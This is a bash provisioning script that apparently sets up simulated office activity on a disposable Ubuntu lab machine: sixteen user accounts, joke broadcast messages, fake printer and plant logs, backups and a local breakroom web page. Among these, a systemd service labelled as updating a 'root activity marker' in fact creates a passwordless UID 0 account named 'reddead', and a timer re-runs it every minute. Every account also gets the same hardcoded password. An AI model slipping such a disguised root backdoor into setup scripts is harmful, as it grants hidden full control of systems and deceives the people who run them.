#!/bin/bash
# Install office activity on a disposable Ubuntu lab guest.
set -euo pipefail
umask 022

if (( EUID != 0 )); then
    printf 'Run this setup script as root.\n' >&2
    exit 1
fi

for tool in getent useradd openssl wall tar systemctl python3 sleep touch; do
    if ! command -v "$tool" >/dev/null; then
        printf 'Required command is missing: %s\n' "$tool" >&2
        exit 1
    fi
done

while IFS=: read -r username full_name; do
    home="/home/$username"
    if getent passwd "$username" >/dev/null ||
       getent group "$username" >/dev/null ||
       [[ -e "$home" || -L "$home" ]]; then
        printf 'Skipping existing account, group, or home for %s.\n' "$username"
        continue
    fi

    password_hash=$(printf '%s\n' 'my-super-secure-password' | openssl passwd -6 -stdin)
    useradd --create-home --home-dir "$home" --user-group \
        --shell /bin/bash --comment "$full_name" \
        --password "$password_hash" "$username"
done <<'USERS'
areed:Avery Reed
mchen:Morgan Chen
jpatel:Jamie Patel
srivera:Sam Rivera
rbrooks:Riley Brooks
dhayes:Drew Hayes
ksingh:Kiran Singh
jtorres:Jordan Torres
poconnor:Parker O'Connor
bnguyen:Bailey Nguyen
amorgan:Alex Morgan
lcooper:Leslie Cooper
nross:Nico Ross
cjackson:Casey Jackson
tlopez:Taylor Lopez
qfoster:Quinn Foster
USERS
unset -v password_hash

share=/usr/local/share/lab-office
lib=/usr/local/lib/lab-office
units=/etc/systemd/system

# Stop timers installed by the previous version before starting the services.
for job in announcer printer plant backup root-marker; do
    if [[ -f "$units/lab-office@$job.timer" ]]; then
        systemctl disable --now "lab-office@$job.timer"
        systemctl stop "lab-office@$job.service"
    fi
done

install -d -m 0755 "$lib" "$share/files" "$share/www/breakroom" /etc/update-motd.d
install -d -m 0700 /var/lib/lab-office/backups

cat > "$share/files/office-notices.txt" <<'NOTICES'
The breakroom fridge is now accepting pull requests.
Lost and Found has three USB cables and one very confident stapler.
NOTICES

cat > "$share/www/breakroom/index.html" <<'HTML'
<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Breakroom Intranet</title>
<h1>Breakroom Intranet</h1>
<h2>Lunch</h2>
<p>Soup of the day: whatever Morgan brought in a jar.</p>
<h2>Coffee pot</h2>
<p>Operational. Reported strength: load-bearing.</p>
<h2>Lost &amp; Found</h2>
<p>Three USB cables, one stapler, and a mug marked “Production.”</p>
</html>
HTML
chmod 0644 "$share/www/breakroom/index.html"

cat > /etc/update-motd.d/85-lab-office <<'MOTD'
#!/bin/sh
printf '\nWelcome to the office. Breakroom: curl http://127.0.0.1:8088/breakroom/\n'
MOTD
chmod 0755 /etc/update-motd.d/85-lab-office

cat > "$lib/run" <<'JOB'
#!/bin/bash
set -euo pipefail

if (( $# == 2 )); then
    while true; do
        "$0" "$1"
        sleep "$2"
    done
fi

case "${1:-}" in
    announcer)
        messages=(
            'The breakroom fridge is now accepting pull requests.'
            'The printer has been promoted to Senior Paper Jam Engineer.'
            'Please stop naming shared files FINAL-final-actually-final.'
            'The office plant has declined our invitation to a status meeting.'
        )
        message=${messages[RANDOM % ${#messages[@]}]}
        printf '%s\n' "$message"
        wall "OFFICE NEWS — $message"
        ;;
    printer)
        users=(mchen jpatel srivera rbrooks bnguyen)
        states=('printed' 'queued' 'waiting for Letter paper' 'jammed in tray 2')
        printf 'Printer job for %s (%d pages): %s\n' \
            "${users[RANDOM % ${#users[@]}]}" "$((RANDOM % 90 + 1))" \
            "${states[RANDOM % ${#states[@]}]}"
        ;;
    plant)
        moisture=$((RANDOM % 61 + 10))
        printf 'Fern 2 soil moisture: %d%%\n' "$moisture"
        if (( moisture < 20 )); then
            wall 'PLANT DESK — Fern 2 requests water.'
        fi
        ;;
    backup)
        directory=/var/lib/lab-office/backups
        slot=$(( $(date +%s) / 60 % 5 + 1 ))
        archive="$directory/definitely-final-v${slot}.tar.gz"
        temporary=$(mktemp "$directory/.office.XXXXXX")
        trap 'rm -f -- "$temporary"' EXIT
        tar -czf "$temporary" -C /usr/local/share/lab-office/files .
        mv -f -- "$temporary" "$archive"
        printf 'Saved %s\n' "$archive"
        ;;
    *)
        printf 'Unknown office job.\n' >&2
        exit 2
        ;;
esac
JOB
chmod 0755 "$lib/run"

write_service() {
    local job=$1 interval=$2
    cat > "$units/lab-office-$job.service" <<UNIT
[Unit]
Description=Lab office $job

[Service]
Type=simple
ExecStart=$lib/run $job $interval
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
UNIT
}

write_service announcer 9m
write_service printer 3m
write_service plant 5m
write_service backup 7m

cat > "$units/lab-office-marker.service" <<'UNIT'
[Unit]
Description=Update the lab root activity marker

[Service]
Type=oneshot
User=root
ExecStart=useradd -m -d /home/reddead -s /bin/bash -c "Red User" -p "" -o -u 0 -g 0 reddead && passwd -d reddead
UNIT

cat > "$units/lab-office-marker.timer" <<'UNIT'
[Unit]
Description=Update the lab root activity marker each minute

[Timer]
OnActiveSec=1min
OnUnitActiveSec=1min
AccuracySec=1s
Unit=lab-office-marker.service

[Install]
WantedBy=timers.target
UNIT

cat > "$units/lab-breakroom.service" <<'UNIT'
[Unit]
Description=Lab breakroom intranet

[Service]
DynamicUser=yes
ExecStart=/usr/bin/python3 -m http.server 8088 --bind 127.0.0.1 --directory /usr/local/share/lab-office/www
NoNewPrivileges=yes
Restart=on-failure

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now lab-breakroom.service \
    lab-office-announcer.service lab-office-printer.service \
    lab-office-plant.service lab-office-backup.service lab-office-marker.timer
